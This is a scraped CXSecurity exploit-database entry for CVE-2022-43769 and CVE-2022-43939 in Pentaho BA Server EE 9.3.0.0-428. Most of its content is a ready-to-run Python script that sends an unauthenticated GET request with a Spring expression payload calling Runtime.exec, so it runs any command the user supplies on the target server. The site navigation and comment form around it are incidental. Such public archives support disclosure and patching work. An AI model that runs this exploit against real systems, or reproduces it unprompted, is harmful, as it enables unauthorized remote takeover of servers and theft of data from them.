---
title: Pentaho BA Server EE 9.3.0.0-428 Server-Side Template Injection / Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023040024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-06
fetch_date: 2025-10-04T11:30:00.095234
---

# Pentaho BA Server EE 9.3.0.0-428 Server-Side Template Injection / Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Pentaho BA Server EE 9.3.0.0-428 Server-Side Template Injection / Remote Code Execution** **2023.04.05**  Credit:  **[dwbzn](https://cxsecurity.com/author/dwbzn/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-43939](https://cxsecurity.com/cveshow/CVE-2022-43939/ "Click to see CVE-2022-43939")**  CWE: **N/A** | |

# Title: Pentaho BA Server EE 9.3.0.0-428 - RCE via Server-Side Template Injection (Unauthenticated)
# Author: dwbzn
# Date: 2022-04-04
# Vendor: https://www.hitachivantara.com/
# Software Link: https://www.hitachivantara.com/en-us/products/lumada-dataops/data-integration-analytics/download-pentaho.html
# Version: Pentaho BA Server 9.3.0.0-428
# CVE: CVE-2022-43769, CVE-2022-43939
# Tested on: Windows 11
# Credits: https://research.aurainfosec.io/pentest/pentah0wnage
# NOTE: This only works on the enterprise edition. Haven't tested it on Linux, but it should work (don't use notepad.exe).
# Unauthenticated RCE via SSTI using CVE-2022-43769 and CVE-2022-43939 (https://research.aurainfosec.io/pentest/pentah0wnage)
import requests
import argparse
parser = argparse.ArgumentParser(description='CVE-2022-43769 + CVE-2022-43939 - Unauthenticated RCE via SSTI')
parser.add\_argument('baseurl', type=str, help='base url e.g. http://127.0.0.1:8080/pentaho')
parser.add\_argument('--cmd', type=str, default='notepad.exe', nargs='?', help='command to execute (default notepad.exe)', required=False)
args = parser.parse\_args()
url = f"{args.baseurl}/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{{T(java.lang.Runtime).getRuntime().exec('{args.cmd}')}}&mgrDn=a&pwd=a"
print ("running...")
r = requests.get(url)
if r.text == 'false':
print ("command should've executed! nice.")
else:
print ("didn't work. sadge...")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040024)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top